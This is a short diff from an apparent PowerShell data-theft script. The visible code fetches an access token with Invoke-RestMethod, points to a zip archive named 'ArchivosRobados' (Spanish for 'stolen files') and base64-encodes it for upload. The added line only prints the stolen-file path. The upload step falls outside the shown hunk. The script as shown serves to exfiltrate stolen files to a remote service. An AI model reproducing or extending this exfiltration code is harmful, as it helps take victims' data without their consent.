@@ -172,6 +172,8 @@ $accessToken = (Invoke-RestMethod @params).access_token
 # Change this to the file you want to upload
 $FileEncrypted = c:\temp\ArchivosRobados-"$ArchivosRobados".zip
 
+Write-Host "Ruta de archivos Robados: $FileEncrypted" -ForegroundColor Red
+
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
